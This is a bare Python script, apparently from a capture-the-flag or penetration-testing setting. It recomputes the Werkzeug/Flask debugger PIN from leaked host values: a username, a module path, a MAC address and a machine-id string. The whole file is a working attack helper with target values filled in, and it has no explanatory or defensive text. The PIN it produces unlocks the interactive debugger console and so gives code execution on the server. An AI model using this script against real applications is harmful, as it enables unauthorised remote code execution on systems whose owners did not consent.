import hashlib
from itertools import chain

pub = [
  'app',
  'flask.app',
  'Flask',
  '/usr/local/lib/python3.11/site-packages/flask/app.py'
]

priv = [
  '2485723361282',
  '0de553c1-4f63-4c45-86ea-9d6bd321e5334001e9b21dcd383eb1dbc4442439612ab493550b5a71330dad4428b72f3023ad'
]

def gen(pub,priv):
  h = hashlib.sha1()

  for bit in chain(pub, priv):
    if not bit:
      continue
    if isinstance(bit, str):
      bit = bit.encode("utf-8")
    h.update(bit)

  h.update(b'cookiesalt')
  h.update(b'pinsalt')
  
  num = ('%09d' % int(h.hexdigest(), 16))[:9]

  rv = None
  for group_size in 5, 4, 3:
    if len(num) % group_size == 0:
      rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                    for x in range(0, len(num), group_size))
      break
  else:
    rv = num

  return rv

print(gen(pub,priv))